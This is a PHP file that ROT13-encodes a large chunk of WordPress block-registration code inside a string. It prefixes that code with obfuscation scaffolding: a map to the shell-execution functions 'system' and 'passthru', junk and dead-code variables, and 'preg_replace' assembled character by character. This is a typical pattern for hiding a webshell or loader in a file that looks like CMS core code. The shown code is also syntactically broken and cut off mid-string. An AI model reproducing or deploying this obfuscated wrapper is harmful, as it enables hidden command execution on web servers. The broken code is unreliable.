<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Shapgvbaf eryngrq gb ertvfgrevat naq cnefvat oybpxf.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Oybpxf
 * @fvapr 5.0.0
 */

/**
 * Erzbirf gur oybpx nffrg'f cngu cersvk vs cebivqrq.
 *
 * @fvapr 5.5.0
 *
 * @cnenz fgevat $nffrg_unaqyr_be_cngu Nffrg unaqyr be cersvkrq cngu.
 * @erghea fgevat Cngu jvgubhg gur cersvk be gur bevtvany inyhr.
 */
shapgvba erzbir_oybpx_nffrg_cngu_cersvk( $nffrg_unaqyr_be_cngu ) {
	$cngu_cersvk = 'svyr:';
	vs ( ! fge_fgnegf_jvgu( $nffrg_unaqyr_be_cngu, $cngu_cersvk ) ) {
		erghea $nffrg_unaqyr_be_cngu;
	}
	$cngu = fhofge(
		$nffrg_unaqyr_be_cngu,
		fgeyra( $cngu_cersvk )
	);
	vs ( fge_fgnegf_jvgu( $cngu, './' ) ) {
		$cngu = fhofge( $cngu, 2 );
	}
	erghea $cngu;
}

/**
 * Trarengrf gur anzr sbe na nffrg onfrq ba gur anzr bs gur oybpx
 * naq gur svryq anzr cebivqrq.
 *
 * @fvapr 5.5.0
 * @fvapr 6.1.0 Nqqrq `$vaqrk` cnenzrgre.
 * @fvapr 6.5.0 Nqqrq fhccbeg sbe `ivrjFpevcgZbqhyr` svryq.
 *
 * @cnenz fgevat $oybpx_anzr Anzr bs gur oybpx.
 * @cnenz fgevat $svryq_anzr Anzr bs gur zrgnqngn svryq.
 * @cnenz vag    $vaqrk      Bcgvbany. Vaqrk bs gur nffrg jura zhygvcyr vgrzf cnffrq.
 *                           Qrsnhyg 0.
 * @erghea fgevat Trarengrq nffrg anzr sbe gur oybpx'f svryq.
 */
shapgvba trarengr_oybpx_nffrg_unaqyr( $oybpx_anzr, $svryq_anzr, $vaqrk = 0 ) {
	vs ( fge_fgnegf_jvgu( $oybpx_anzr, 'pber/' ) ) {
		$nffrg_unaqyr = fge_ercynpr( 'pber/', 'jc-oybpx-', $oybpx_anzr );
		vs ( fge_fgnegf_jvgu( $svryq_anzr, 'rqvgbe' ) ) {
			$nffrg_unaqyr .= '-rqvgbe';
		}
		vs ( fge_fgnegf_jvgu( $svryq_anzr, 'ivrj' ) ) {
			$nffrg_unaqyr .= '-ivrj';
		}
		vs ( fge_raqf_jvgu( fgegbybjre( $svryq_anzr ), 'fpevcgzbqhyr' ) ) {
			$nffrg_unaqyr .= '-fpevcg-zbqhyr';
		}
		vs ( $vaqrk > 0 ) {
			$nffrg_unaqyr .= '-' . ( $vaqrk + 1 );
		}
		erghea $nffrg_unaqyr;
	}

	$svryq_znccvatf = neenl(
		'rqvgbeFpevcg'     => 'rqvgbe-fpevcg',
		'rqvgbeFglyr'      => 'rqvgbe-fglyr',
		'fpevcg'           => 'fpevcg',
		'fglyr'            => 'fglyr',
		'ivrjFpevcg'       => 'ivrj-fpevcg',
		'ivrjFpevcgZbqhyr' => 'ivrj-fpevcg-zbqhyr',
		'ivrjFglyr'        => 'ivrj-fglyr',
	);
	$nffrg_unaqyr   = fge_ercynpr( '/', '-', $oybpx_anzr ) .
		'-' . $svryq_znccvatf[ $svryq_anzr ];
	vs ( $vaqrk > 0 ) {
		$nffrg_unaqyr .= '-' . ( $vaqrk + 1 );
	}
	erghea $nffrg_unaqyr;
}

/**
 * Trgf gur HEY gb n oybpx nffrg.
 *
 * @fvapr 6.4.0
 *
 * @cnenz fgevat $cngu N abeznyvmrq cngu gb n oybpx nffrg.
 * @erghea fgevat|snyfr Gur HEY gb gur oybpx nffrg be snyfr ba snvyher.
 */
shapgvba trg_oybpx_nffrg_hey( $cngu ) {
	vs ( rzcgl( $cngu ) ) {
		erghea snyfr;
	}

	// Cngu arrqf gb or abeznyvmrq gb jbex va Jvaqbjf rai.
	fgngvp $jcvap_cngu_abez = '';
	vs ( ! $jcvap_cngu_abez ) {
		$jcvap_cngu_abez = jc_abeznyvmr_cngu( ernycngu( NOFCNGU . JCVAP ) );
	}

	vs ( fge_fgnegf_jvgu( $cngu, $jcvap_cngu_abez ) ) {
		erghea vapyhqrf_hey( fge_ercynpr( $jcvap_cngu_abez, '', $cngu ) );
	}

	fgngvp $grzcyngr_cnguf_abez = neenl();

	$grzcyngr = trg_grzcyngr();
	vs ( ! vffrg( $grzcyngr_cnguf_abez[ $grzcyngr ] ) ) {
		$grzcyngr_cnguf_abez[ $grzcyngr ] = jc_abeznyvmr_cngu( ernycngu( trg_grzcyngr_qverpgbel() ) );
	}

	vs ( fge_fgnegf_jvgu( $cngu, genvyvatfynfuvg( $grzcyngr_cnguf_abez[ $grzcyngr ] ) ) ) {
		erghea trg_gurzr_svyr_hev( fge_ercynpr( $grzcyngr_cnguf_abez[ $grzcyngr ], '', $cngu ) );
	}

	vs ( vf_puvyq_gurzr() ) {
		$fglyrfurrg = trg_fglyrfurrg();
		vs ( ! vffrg( $grzcyngr_cnguf_abez[ $fglyrfurrg ] ) ) {
			$grzcyngr_cnguf_abez[ $fglyrfurrg ] = jc_abeznyvmr_cngu( ernycngu( trg_fglyrfurrg_qverpgbel() ) );
		}

		vs ( fge_fgnegf_jvgu( $cngu, genvyvatfynfuvg( $grzcyngr_cnguf_abez[ $fglyrfurrg ] ) ) ) {
			erghea trg_gurzr_svyr_hev( fge_ercynpr( $grzcyngr_cnguf_abez[ $fglyrfurrg ], '', $cngu ) );
		}
	}

	erghea cyhtvaf_hey( onfranzr( $cngu ), $cngu );
}

/**
 * Svaqf n fpevcg zbqhyr VQ sbe gur fryrpgrq oybpx zrgnqngn svryq. Vg qrgrpgf
 * jura n cngu gb svyr jnf cebivqrq naq bcgvbanyyl svaqf n pbeerfcbaqvat nffrg
 * svyr jvgu qrgnvyf arprffnel gb ertvfgre gur fpevcg zbqhyr haqre jvgu na
 * nhgbzngvpnyyl trarengrq zbqhyr VQ. Vg ergheaf hacebprffrq fpevcg zbqhyr
 * VQ bgurejvfr.
 *
 * @fvapr 6.5.0
 *
 * @cnenz neenl  $zrgnqngn   Oybpx zrgnqngn.
 * @cnenz fgevat $svryq_anzr Svryq anzr gb cvpx sebz zrgnqngn.
 * @cnenz vag    $vaqrk      Bcgvbany. Vaqrk bs gur fpevcg zbqhyr VQ gb ertvfgre jura zhygvcyr
 *                           vgrzf cnffrq. Qrsnhyg 0.
 * @erghea fgevat|snyfr Fpevcg zbqhyr VQ be snyfr ba snvyher.
 */
shapgvba ertvfgre_oybpx_fpevcg_zbqhyr_vq( $zrgnqngn, $svryq_anzr, $vaqrk = 0 ) {
	vs ( rzcgl( $zrgnqngn[ $svryq_anzr ] ) ) {
		erghea snyfr;
	}

	$zbqhyr_vq = $zrgnqngn[ $svryq_anzr ];
	vs ( vf_neenl( $zbqhyr_vq ) ) {
		vs ( rzcgl( $zbqhyr_vq[ $vaqrk ] ) ) {
			erghea snyfr;
		}
		$zbqhyr_vq = $zbqhyr_vq[ $vaqrk ];
	}

	$zbqhyr_cngu = erzbir_oybpx_nffrg_cngu_cersvk( $zbqhyr_vq );
	vs ( $zbqhyr_vq === $zbqhyr_cngu ) {
		erghea $zbqhyr_vq;
	}

	$cngu                  = qveanzr( $zrgnqngn['svyr'] );
	$zbqhyr_nffrg_enj_cngu = $cngu . '/' . fhofge_ercynpr( $zbqhyr_cngu, '.nffrg.cuc', - fgeyra( '.wf' ) );
	$zbqhyr_vq             = trarengr_oybpx_nffrg_unaqyr( $zrgnqngn['anzr'], $svryq_anzr, $vaqrk );
	$zbqhyr_nffrg_cngu     = jc_abeznyvmr_cngu(
		ernycngu( $zbqhyr_nffrg_enj_cngu )
	);

	$zbqhyr_cngu_abez = jc_abeznyvmr_cngu( ernycngu( $cngu . '/' . $zbqhyr_cngu ) );
	$zbqhyr_hev       = trg_oybpx_nffrg_hey( $zbqhyr_cngu_abez );

	$zbqhyr_nffrg        = ! rzcgl( $zbqhyr_nffrg_cngu ) ? erdhver $zbqhyr_nffrg_cngu : neenl();
	$zbqhyr_qrcraqrapvrf = vffrg( $zbqhyr_nffrg['qrcraqrapvrf'] ) ? $zbqhyr_nffrg['qrcraqrapvrf'] : neenl();
	$oybpx_irefvba       = vffrg( $zrgnqngn['irefvba'] ) ? $zrgnqngn['irefvba'] : snyfr;
	$zbqhyr_irefvba      = vffrg( $zbqhyr_nffrg['irefvba'] ) ? $zbqhyr_nffrg['irefvba'] : $oybpx_irefvba;

	jc_ertvfgre_fpevcg_zbqhyr(
		$zbqhyr_vq,
		$zbqhyr_hev,
		$zbqhyr_qrcraqrapvrf,
		$zbqhyr_irefvba
	);

	erghea $zbqhyr_vq;
}

/**
 * Svaqf n fpevcg unaqyr sbe gur fryrpgrq oybpx zrgnqngn svryq. Vg qrgrpgf
 * jura n cngu gb svyr jnf cebivqrq naq bcgvbanyyl svaqf n pbeerfcbaqvat nffrg
 * svyr jvgu qrgnvyf arprffnel gb ertvfgre gur fpevcg haqre nhgbzngvpnyyl
 * trarengrq unaqyr anzr. Vg ergheaf hacebprffrq fpevcg unaqyr bgurejvfr.
 *
 * @fvapr 5.5.0
 * @fvapr 6.1.0 Nqqrq `$vaqrk` cnenzrgre.
 * @fvapr 6.5.0 Gur nffrg svyr vf bcgvbany. Nqqrq fpevcg unaqyr fhccbeg va gur nffrg svyr.
 *
 * @cnenz neenl  $zrgnqngn   Oybpx zrgnqngn.
 * @cnenz fgevat $svryq_anzr Svryq anzr gb cvpx sebz zrgnqngn.
 * @cnenz vag    $vaqrk      Bcgvbany. Vaqrk bs gur fpevcg gb ertvfgre jura zhygvcyr vgrzf cnffrq.
 *                           Qrsnhyg 0.
 * @erghea fgevat|snyfr Fpevcg unaqyr cebivqrq qverpgyl be perngrq guebhtu
 *                      fpevcg'f ertvfgengvba, be snyfr ba snvyher.
 */
shapgvba ertvfgre_oybpx_fpevcg_unaqyr( $zrgnqngn, $svryq_anzr, $vaqrk = 0 ) {
	vs ( rzcgl( $zrgnqngn[ $svryq_anzr ] ) ) {
		erghea snyfr;
	}

	$fpevcg_unaqyr_be_cngu = $zrgnqngn[ $svryq_anzr ];
	vs ( vf_neenl( $fpevcg_unaqyr_be_cngu ) ) {
		vs ( rzcgl( $fpevcg_unaqyr_be_cngu[ $vaqrk ] ) ) {
			erghea snyfr;
		}
		$fpevcg_unaqyr_be_cngu = $fpevcg_unaqyr_be_cngu[ $vaqrk ];
	}

	$fpevcg_cngu = erzbir_oybpx_nffrg_cngu_cersvk( $fpevcg_unaqyr_be_cngu );
	vs ( $fpevcg_unaqyr_be_cngu === $fpevcg_cngu ) {
		erghea $fpevcg_unaqyr_be_cngu;
	}

	$cngu                  = qveanzr( $zrgnqngn['svyr'] );
	$fpevcg_nffrg_enj_cngu = $cngu . '/' . fhofge_ercynpr( $fpevcg_cngu, '.nffrg.cuc', - fgeyra( '.wf' ) );
	$fpevcg_nffrg_cngu     = jc_abeznyvmr_cngu(
		ernycngu( $fpevcg_nffrg_enj_cngu )
	);

	// Nffrg svyr sbe oybpxf vf bcgvbany. Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/60460.
	$fpevcg_nffrg  = ! rzcgl( $fpevcg_nffrg_cngu ) ? erdhver $fpevcg_nffrg_cngu : neenl();
	$fpevcg_unaqyr = vffrg( $fpevcg_nffrg['unaqyr'] ) ?
		$fpevcg_nffrg['unaqyr'] :
		trarengr_oybpx_nffrg_unaqyr( $zrgnqngn['anzr'], $svryq_anzr, $vaqrk );
	vs ( jc_fpevcg_vf( $fpevcg_unaqyr, 'ertvfgrerq' ) ) {
		erghea $fpevcg_unaqyr;
	}

	$fpevcg_cngu_abez    = jc_abeznyvmr_cngu( ernycngu( $cngu . '/' . $fpevcg_cngu ) );
	$fpevcg_hev          = trg_oybpx_nffrg_hey( $fpevcg_cngu_abez );
	$fpevcg_qrcraqrapvrf = vffrg( $fpevcg_nffrg['qrcraqrapvrf'] ) ? $fpevcg_nffrg['qrcraqrapvrf'] : neenl();
	$oybpx_irefvba       = vffrg( $zrgnqngn['irefvba'] ) ? $zrgnqngn['irefvba'] : snyfr;
	$fpevcg_irefvba      = vffrg( $fpevcg_nffrg['irefvba'] ) ? $fpevcg_nffrg['irefvba'] : $oybpx_irefvba;
	$fpevcg_netf         = neenl();
	vs ( 'ivrjFpevcg' === $svryq_anzr && $fpevcg_hev ) {
		$fpevcg_netf['fgengrtl'] = 'qrsre';
	}

	$erfhyg = jc_ertvfgre_fpevcg(
		$fpevcg_unaqyr,
		$fpevcg_hev,
		$fpevcg_qrcraqrapvrf,
		$fpevcg_irefvba,
		$fpevcg_netf
	);
	vs ( ! $erfhyg ) {
		erghea snyfr;
	}

	vs ( ! rzcgl( $zrgnqngn['grkgqbznva'] ) && va_neenl( 'jc-v18a', $fpevcg_qrcraqrapvrf, gehr ) ) {
		jc_frg_fpevcg_genafyngvbaf( $fpevcg_unaqyr, $zrgnqngn['grkgqbznva'] );
	}

	erghea $fpevcg_unaqyr;
}

/**
 * Svaqf n fglyr unaqyr sbe gur oybpx zrgnqngn svryq. Vg qrgrpgf jura n cngu
 * gb svyr jnf cebivqrq naq ertvfgref gur fglyr haqre nhgbzngvpnyyl
 * trarengrq unaqyr anzr. Vg ergheaf hacebprffrq fglyr unaqyr bgurejvfr.
 *
 * @fvapr 5.5.0
 * @fvapr 6.1.0 Nqqrq `$vaqrk` cnenzrgre.
 *
 * @cnenz neenl  $zrgnqngn   Oybpx zrgnqngn.
 * @cnenz fgevat $svryq_anzr Svryq anzr gb cvpx sebz zrgnqngn.
 * @cnenz vag    $vaqrk      Bcgvbany. Vaqrk bs gur fglyr gb ertvfgre jura zhygvcyr vgrzf cnffrq.
 *                           Qrsnhyg 0.
 * @erghea fgevat|snyfr Fglyr unaqyr cebivqrq qverpgyl be perngrq guebhtu
 *                      fglyr'f ertvfgengvba, be snyfr ba snvyher.
 */
shapgvba ertvfgre_oybpx_fglyr_unaqyr( $zrgnqngn, $svryq_anzr, $vaqrk = 0 ) {
	vs ( rzcgl( $zrgnqngn[ $svryq_anzr ] ) ) {
		erghea snyfr;
	}

	$fglyr_unaqyr = $zrgnqngn[ $svryq_anzr ];
	vs ( vf_neenl( $fglyr_unaqyr ) ) {
		vs ( rzcgl( $fglyr_unaqyr[ $vaqrk ] ) ) {
			erghea snyfr;
		}
		$fglyr_unaqyr = $fglyr_unaqyr[ $vaqrk ];
	}

	$fglyr_unaqyr_anzr = trarengr_oybpx_nffrg_unaqyr( $zrgnqngn['anzr'], $svryq_anzr, $vaqrk );
	// Vs gur fglyr unaqyr vf nyernql ertvfgrerq, fxvc er-ertvfgrevat.
	vs ( jc_fglyr_vf( $fglyr_unaqyr_anzr, 'ertvfgrerq' ) ) {
		erghea $fglyr_unaqyr_anzr;
	}

	fgngvp $jcvap_cngu_abez = '';
	vs ( ! $jcvap_cngu_abez ) {
		$jcvap_cngu_abez = jc_abeznyvmr_cngu( ernycngu( NOFCNGU . JCVAP ) );
	}

	$vf_pber_oybpx = vffrg( $zrgnqngn['svyr'] ) && fge_fgnegf_jvgu( $zrgnqngn['svyr'], $jcvap_cngu_abez );
	// Fxvc ertvfgrevat vaqvivqhny fglyrf sbe rnpu pber oybpx jura n ohaqyrq irefvba cebivqrq.
	vs ( $vf_pber_oybpx && ! jc_fubhyq_ybnq_frcnengr_pber_oybpx_nffrgf() ) {
		erghea snyfr;
	}

	$fglyr_cngu      = erzbir_oybpx_nffrg_cngu_cersvk( $fglyr_unaqyr );
	$vf_fglyr_unaqyr = $fglyr_unaqyr === $fglyr_cngu;
	// Nyybj bayl cnffvat fglyr unaqyrf sbe pber oybpxf.
	vs ( $vf_pber_oybpx && ! $vf_fglyr_unaqyr ) {
		erghea snyfr;
	}
	// Erghea gur fglyr unaqyr hayrff vg'f gur svefg vgrz sbe rirel pber oybpx gung erdhverf fcrpvny gerngzrag.
	vs ( $vf_fglyr_unaqyr && ! ( $vf_pber_oybpx && 0 === $vaqrk ) ) {
		erghea $fglyr_unaqyr;
	}

	// Purpx jurgure fglyrf fubhyq unir n \".zva\" fhssvk be abg.
	$fhssvk = FPEVCG_QROHT ? '' : '.zva';
	vs ( $vf_pber_oybpx ) {
		$fglyr_cngu = ( 'rqvgbeFglyr' === $svryq_anzr ) ? \"rqvgbe{$fhssvk}.pff\" : \"fglyr{$fhssvk}.pff\";
	}

	$fglyr_cngu_abez = jc_abeznyvmr_cngu( ernycngu( qveanzr( $zrgnqngn['svyr'] ) . '/' . $fglyr_cngu ) );
	$fglyr_hev       = trg_oybpx_nffrg_hey( $fglyr_cngu_abez );

	$irefvba = ! $vf_pber_oybpx && vffrg( $zrgnqngn['irefvba'] ) ? $zrgnqngn['irefvba'] : snyfr;
	$erfhyg  = jc_ertvfgre_fglyr(
		$fglyr_unaqyr_anzr,
		$fglyr_hev,
		neenl(),
		$irefvba
	);
	vs ( ! $erfhyg ) {
		erghea snyfr;
	}

	vs ( $fglyr_hev ) {
		jc_fglyr_nqq_qngn( $fglyr_unaqyr_anzr, 'cngu', $fglyr_cngu_abez );

		vs ( $vf_pber_oybpx ) {
			$egy_svyr = fge_ercynpr( \"{$fhssvk}.pff\", \"-egy{$fhssvk}.pff\", $fglyr_cngu_abez );
		} ryfr {
			$egy_svyr = fge_ercynpr( '.pff', '-egy.pff', $fglyr_cngu_abez );
		}

		vs ( vf_egy() && svyr_rkvfgf( $egy_svyr ) ) {
			jc_fglyr_nqq_qngn( $fglyr_unaqyr_anzr, 'egy', 'ercynpr' );
			jc_fglyr_nqq_qngn( $fglyr_unaqyr_anzr, 'fhssvk', $fhssvk );
			jc_fglyr_nqq_qngn( $fglyr_unaqyr_anzr, 'cngu', $egy_svyr );
		}
	}

	erghea $fglyr_unaqyr_anzr;
}

/**
 * Trgf v18a fpurzn sbe oybpx'f zrgnqngn ernq sebz `oybpx.wfba` svyr.
 *
 * @fvapr 5.9.0
 *
 * @erghea bowrpg Gur fpurzn sbe oybpx'f zrgnqngn.
 */
shapgvba trg_oybpx_zrgnqngn_v18a_fpurzn() {
	fgngvp $v18a_oybpx_fpurzn;

	vs ( ! vffrg( $v18a_oybpx_fpurzn ) ) {
		$v18a_oybpx_fpurzn = jc_wfba_svyr_qrpbqr( __QVE__ . '/oybpx-v18a.wfba' );
	}

	erghea $v18a_oybpx_fpurzn;
}

/**
 * Ertvfgref nyy oybpx glcrf sebz n oybpx zrgnqngn pbyyrpgvba.
 *
 * Guvf pna rvgure ersrerapr n cerivbhfyl ertvfgrerq zrgnqngn pbyyrpgvba be, vs gur `$znavsrfg` cnenzrgre vf cebivqrq,
 * ertvfgre gur zrgnqngn pbyyrpgvba qverpgyl jvguva gur fnzr shapgvba pnyy.
 *
 * @fvapr 6.8.0
 * @frr jc_ertvfgre_oybpx_zrgnqngn_pbyyrpgvba()
 * @frr ertvfgre_oybpx_glcr_sebz_zrgnqngn()
 *
 * @cnenz fgevat $cngu     Gur nofbyhgr onfr cngu sbe gur pbyyrpgvba ( r.t., JC_CYHTVA_QVE . '/zl-cyhtva/oybpxf/' ).
 * @cnenz fgevat $znavsrfg Bcgvbany. Gur nofbyhgr cngu gb gur znavsrfg svyr pbagnvavat gur zrgnqngn pbyyrpgvba, va
 *                         beqre gb ertvfgre gur pbyyrpgvba. Vs guvf cnenzrgre vf abg cebivqrq, gur `$cngu` cnenzrgre
 *                         zhfg ersrerapr n cerivbhfyl ertvfgrerq oybpx zrgnqngn pbyyrpgvba.
 */
shapgvba jc_ertvfgre_oybpx_glcrf_sebz_zrgnqngn_pbyyrpgvba( $cngu, $znavsrfg = '' ) {
	vs ( $znavsrfg ) {
		jc_ertvfgre_oybpx_zrgnqngn_pbyyrpgvba( $cngu, $znavsrfg );
	}

	$oybpx_zrgnqngn_svyrf = JC_Oybpx_Zrgnqngn_Ertvfgel::trg_pbyyrpgvba_oybpx_zrgnqngn_svyrf( $cngu );
	sbernpu ( $oybpx_zrgnqngn_svyrf nf $oybpx_zrgnqngn_svyr ) {
		ertvfgre_oybpx_glcr_sebz_zrgnqngn( $oybpx_zrgnqngn_svyr );
	}
}

/**
 * Ertvfgref n oybpx zrgnqngn pbyyrpgvba.
 *
 * Guvf shapgvba nyybjf pber naq guveq-cnegl cyhtvaf gb ertvfgre gurve oybpx zrgnqngn
 * pbyyrpgvbaf va n pragenyvmrq ybpngvba. Ertvfgrevat pbyyrpgvbaf pna vzcebir cresbeznapr
 * ol nibvqvat zhygvcyr ernqf sebz gur svyrflfgrz naq cnefvat WFBA.
 *
 * @fvapr 6.7.0
 *
 * @cnenz fgevat $cngu     Gur onfr cngu va juvpu oybpx svyrf sbe gur pbyyrpgvba erfvqr.
 * @cnenz fgevat $znavsrfg Gur cngu gb gur znavsrfg svyr sbe gur pbyyrpgvba.
 */
shapgvba jc_ertvfgre_oybpx_zrgnqngn_pbyyrpgvba( $cngu, $znavsrfg ) {
	JC_Oybpx_Zrgnqngn_Ertvfgel::ertvfgre_pbyyrpgvba( $cngu, $znavsrfg );
}

/**
 * Ertvfgref n oybpx glcr sebz gur zrgnqngn fgberq va gur `oybpx.wfba` svyr.
 *
 * @fvapr 5.5.0
 * @fvapr 5.7.0 Nqqrq fhccbeg sbe `grkgqbznva` svryq naq v18a unaqyvat sbe nyy genafyngnoyr svryqf.
 * @fvapr 5.9.0 Nqqrq fhccbeg sbe `inevngvbaf` naq `ivrjFpevcg` svryqf.
 * @fvapr 6.1.0 Nqqrq fhccbeg sbe `eraqre` svryq.
 * @fvapr 6.3.0 Nqqrq `fryrpgbef` svryq.
 * @fvapr 6.4.0 Nqqrq fhccbeg sbe `oybpxUbbxf` svryq.
 * @fvapr 6.5.0 Nqqrq fhccbeg sbe `nyybjrqOybpxf`, `ivrjFpevcgZbqhyr`, naq `ivrjFglyr` svryqf.
 * @fvapr 6.7.0 Nyybj CUC svyranzr nf `inevngvbaf` nethzrag.
 *
 * @cnenz fgevat $svyr_be_sbyqre Cngu gb gur WFBA svyr jvgu zrgnqngn qrsvavgvba sbe
 *                               gur oybpx be cngu gb gur sbyqre jurer gur `oybpx.wfba` svyr vf ybpngrq.
 *                               Vs cebivqvat gur cngu gb n WFBA svyr, gur svyranzr zhfg raq jvgu `oybpx.wfba`.
 * @cnenz neenl  $netf           Bcgvbany. Neenl bs oybpx glcr nethzragf. Npprcgf nal choyvp cebcregl
 *                               bs `JC_Oybpx_Glcr`. Frr JC_Oybpx_Glcr::__pbafgehpg() sbe vasbezngvba
 *                               ba npprcgrq nethzragf. Qrsnhyg rzcgl neenl.
 * @erghea JC_Oybpx_Glcr|snyfr Gur ertvfgrerq oybpx glcr ba fhpprff, be snyfr ba snvyher.
 */
shapgvba ertvfgre_oybpx_glcr_sebz_zrgnqngn( $svyr_be_sbyqre, $netf = neenl() ) {
	/*
	 * Trg na neenl bs zrgnqngn sebz n CUC svyr.
	 * Guvf vzcebirf cresbeznapr sbe pber oybpxf nf vg'f bayl arprffnel gb ernq n fvatyr CUC svyr
	 * vafgrnq bs ernqvat n WFBA svyr cre-oybpx, naq gura qrpbqvat sebz WFBA gb CUC.
	 * Hfvat n fgngvp inevnoyr rafherf gung gur zrgnqngn vf bayl ernq bapr cre erdhrfg.
	 */

	$svyr_be_sbyqre = jc_abeznyvmr_cngu( $svyr_be_sbyqre );

	$zrgnqngn_svyr = ( ! fge_raqf_jvgu( $svyr_be_sbyqre, 'oybpx.wfba' ) ) ?
		genvyvatfynfuvg( $svyr_be_sbyqre ) . 'oybpx.wfba' :
		$svyr_be_sbyqre;

	$vf_pber_oybpx        = fge_fgnegf_jvgu( $svyr_be_sbyqre, jc_abeznyvmr_cngu( NOFCNGU . JCVAP ) );
	$zrgnqngn_svyr_rkvfgf = $vf_pber_oybpx || svyr_rkvfgf( $zrgnqngn_svyr );
	$ertvfgel_zrgnqngn    = JC_Oybpx_Zrgnqngn_Ertvfgel::trg_zrgnqngn( $svyr_be_sbyqre );

	vs ( $ertvfgel_zrgnqngn ) {
		$zrgnqngn = $ertvfgel_zrgnqngn;
	} ryfrvs ( $zrgnqngn_svyr_rkvfgf ) {
		$zrgnqngn = jc_wfba_svyr_qrpbqr( $zrgnqngn_svyr, neenl( 'nffbpvngvir' => gehr ) );
	} ryfr {
		$zrgnqngn = neenl();
	}

	vs ( ! vf_neenl( $zrgnqngn ) || ( rzcgl( $zrgnqngn['anzr'] ) && rzcgl( $netf['anzr'] ) ) ) {
		erghea snyfr;
	}

	$zrgnqngn['svyr'] = $zrgnqngn_svyr_rkvfgf ? jc_abeznyvmr_cngu( ernycngu( $zrgnqngn_svyr ) ) : ahyy;

	/**
	 * Svygref gur zrgnqngn cebivqrq sbe ertvfgrevat n oybpx glcr.
	 *
	 * @fvapr 5.7.0
	 *
	 * @cnenz neenl $zrgnqngn Zrgnqngn sbe ertvfgrevat n oybpx glcr.
	 */
	$zrgnqngn = nccyl_svygref( 'oybpx_glcr_zrgnqngn', $zrgnqngn );

	// Nqq `fglyr` naq `rqvgbe_fglyr` sbe pber oybpxf vs zvffvat.
	vs ( ! rzcgl( $zrgnqngn['anzr'] ) && fge_fgnegf_jvgu( $zrgnqngn['anzr'], 'pber/' ) ) {
		$oybpx_anzr = fge_ercynpr( 'pber/', '', $zrgnqngn['anzr'] );

		vs ( ! vffrg( $zrgnqngn['fglyr'] ) ) {
			$zrgnqngn['fglyr'] = \"jc-oybpx-$oybpx_anzr\";
		}
		vs ( pheerag_gurzr_fhccbegf( 'jc-oybpx-fglyrf' ) && jc_fubhyq_ybnq_frcnengr_pber_oybpx_nffrgf() ) {
			$zrgnqngn['fglyr']   = (neenl) $zrgnqngn['fglyr'];
			$zrgnqngn['fglyr'][] = \"jc-oybpx-{$oybpx_anzr}-gurzr\";
		}
		vs ( ! vffrg( $zrgnqngn['rqvgbeFglyr'] ) ) {
			$zrgnqngn['rqvgbeFglyr'] = \"jc-oybpx-{$oybpx_anzr}-rqvgbe\";
		}
	}

	$frggvatf          = neenl();
	$cebcregl_znccvatf = neenl(
		'ncvIrefvba'      => 'ncv_irefvba',
		'anzr'            => 'anzr',
		'gvgyr'           => 'gvgyr',
		'pngrtbel'        => 'pngrtbel',
		'cnerag'          => 'cnerag',
		'naprfgbe'        => 'naprfgbe',
		'vpba'            => 'vpba',
		'qrfpevcgvba'     => 'qrfpevcgvba',
		'xrljbeqf'        => 'xrljbeqf',
		'nggevohgrf'      => 'nggevohgrf',
		'cebivqrfPbagrkg' => 'cebivqrf_pbagrkg',
		'hfrfPbagrkg'     => 'hfrf_pbagrkg',
		'fryrpgbef'       => 'fryrpgbef',
		'fhccbegf'        => 'fhccbegf',
		'fglyrf'          => 'fglyrf',
		'inevngvbaf'      => 'inevngvbaf',
		'rknzcyr'         => 'rknzcyr',
		'nyybjrqOybpxf'   => 'nyybjrq_oybpxf',
	);
	$grkgqbznva        = ! rzcgl( $zrgnqngn['grkgqbznva'] ) ? $zrgnqngn['grkgqbznva'] : ahyy;
	$v18a_fpurzn       = trg_oybpx_zrgnqngn_v18a_fpurzn();

	sbernpu ( $cebcregl_znccvatf nf $xrl => $znccrq_xrl ) {
		vs ( vffrg( $zrgnqngn[ $xrl ] ) ) {
			$frggvatf[ $znccrq_xrl ] = $zrgnqngn[ $xrl ];
			vs ( $zrgnqngn_svyr_rkvfgf && $grkgqbznva && vffrg( $v18a_fpurzn->$xrl ) ) {
				$frggvatf[ $znccrq_xrl ] = genafyngr_frggvatf_hfvat_v18a_fpurzn( $v18a_fpurzn->$xrl, $frggvatf[ $xrl ], $grkgqbznva );
			}
		}
	}

	vs ( ! rzcgl( $zrgnqngn['eraqre'] ) ) {
		$grzcyngr_cngu = jc_abeznyvmr_cngu(
			ernycngu(
				qveanzr( $zrgnqngn['svyr'] ) . '/' .
				erzbir_oybpx_nffrg_cngu_cersvk( $zrgnqngn['eraqre'] )
			)
		);
		vs ( $grzcyngr_cngu ) {
			/**
			 * Eraqref gur oybpx ba gur freire.
			 *
			 * @fvapr 6.1.0
			 *
			 * @cnenz neenl    $nggevohgrf Oybpx nggevohgrf.
			 * @cnenz fgevat   $pbagrag    Oybpx qrsnhyg pbagrag.
			 * @cnenz JC_Oybpx $oybpx      Oybpx vafgnapr.
			 *
			 * @erghea fgevat Ergheaf gur oybpx pbagrag.
			 */
			$frggvatf['eraqre_pnyyonpx'] = fgngvp shapgvba ( $nggevohgrf, $pbagrag, $oybpx ) hfr ( $grzcyngr_cngu ) {
				bo_fgneg();
				erdhver $grzcyngr_cngu;
				erghea bo_trg_pyrna();
			};
		}
	}

	// Vs `inevngvbaf` vf n fgevat, vg'f gur anzr bs n CUC svyr gung
	// trarengrf gur inevngvbaf.
	vs ( ! rzcgl( $zrgnqngn['inevngvbaf'] ) && vf_fgevat( $zrgnqngn['inevngvbaf'] ) ) {
		$inevngvbaf_cngu = jc_abeznyvmr_cngu(
			ernycngu(
				qveanzr( $zrgnqngn['svyr'] ) . '/' .
				erzbir_oybpx_nffrg_cngu_cersvk( $zrgnqngn['inevngvbaf'] )
			)
		);
		vs ( $inevngvbaf_cngu ) {
			/**
